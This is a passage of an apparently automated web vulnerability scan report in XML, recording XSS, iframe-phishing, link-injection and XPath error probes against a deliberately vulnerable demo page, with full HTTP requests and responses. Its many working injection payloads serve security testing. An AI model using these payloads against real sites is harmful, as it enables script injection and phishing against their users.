Incompatible XPath key, either &gt;"'&gt;&lt;img src=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;alert(25226)&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12404">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;'&gt;&lt;script&gt;alert(25232)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1028" Length="12" String="alert(25232)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 51
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&gt;'&gt;&lt;script&gt;alert(25232)&lt;/script&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 564
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either &gt;'&gt;&lt;script&gt;alert(25232)&lt;/script&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12406">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;'&gt;&lt;%00script&gt;alert(25236)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1032" Length="12" String="alert(25236)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 54
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&gt;'&gt;&lt;%00script&gt;alert(25236)&lt;/script&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 565
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either &gt;'&gt;&lt; script&gt;alert(25236)&lt;/script&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12407">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;"&gt;&lt;%00script&gt;alert(25238)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1032" Length="12" String="alert(25238)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 54
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&gt;"&gt;&lt;%00script&gt;alert(25238)&lt;/script&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 565
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either &gt;"&gt;&lt; script&gt;alert(25238)&lt;/script&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12412">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825248%29%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1067" Length="12" String="alert(25248)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 76
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825248%29%3E&amp;password=
HTTP/1.1 200 OK
Content-Length: 570
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either '"&gt;&lt;iframe src=javascript:alert(25248)&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12414">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Cscript%3Ealert(25252)%3C%2Fscript%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1043" Length="12" String="alert(25252)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 67
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27%22%3E%3Cscript%3Ealert(25252)%3C%2Fscript%3E&amp;password=
HTTP/1.1 200 OK
Content-Length: 563
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either '"&gt;&lt;script&gt;alert(25252)&lt;/script&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12422">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25268)&gt;HoverMe&lt;/A&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, which will be executed once the user activates the OnMouseOver function (i.e., hovers with the mouse cursor over the vulnerable control). This means that the application is vulnerable to Cross-Site Scripting attacks.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1047" Length="38" String="&lt;A HREF=Link onMouseOver=alert(25268)&gt;" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 79
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25268)&gt;HoverMe&lt;/A&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 583
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either '"&gt;&lt;A HREF=Link onMouseOver=alert(25268)&gt;HoverMe&lt;/A&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attUndefinedState" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12440">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="650" Length="305" String="Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 22
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 532
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either ' or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12441">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=\'</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="649" Length="305" String="Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 21
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=\'&amp;password=
HTTP/1.1 200 OK
Content-Length: 533
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either \' or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12447">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%00</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="650" Length="306" String="Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 22
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%00&amp;password=
HTTP/1.1 200 OK
Content-Length: 533
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either   or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="phishingInFrames" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12454">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E</Difference>
          <Reasoning>The test response contained a link to the URL "http://demo.testfire.net, which proves that the Phishing attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1057" Length="24" String="http://demo.testfire.net" />
            <Validation Location="1064" Length="17" String="demo.testfire.net" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 77
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E&amp;password=
HTTP/1.1 200 OK
Content-Length: 571
Date: Mon, 14 Jul 2014 14:47:26 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either '"&gt;&lt;iframe src=http://demo.testfire.net&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attLinkInjection" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12464">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E</Difference>
          <Reasoning>The test response contained a link to the file "WF_XSRF.html, which proves that the Cross-Site Request Forgery attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1044" Length="13" String="/WF_XSRF.html" />
            <Validation Location="1045" Length="12" String="WF_XSRF.html" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 65
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E&amp;password=
HTTP/1.1 200 OK
Content-Length: 560
Date: Mon, 14 Jul 2014 14:47:27 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

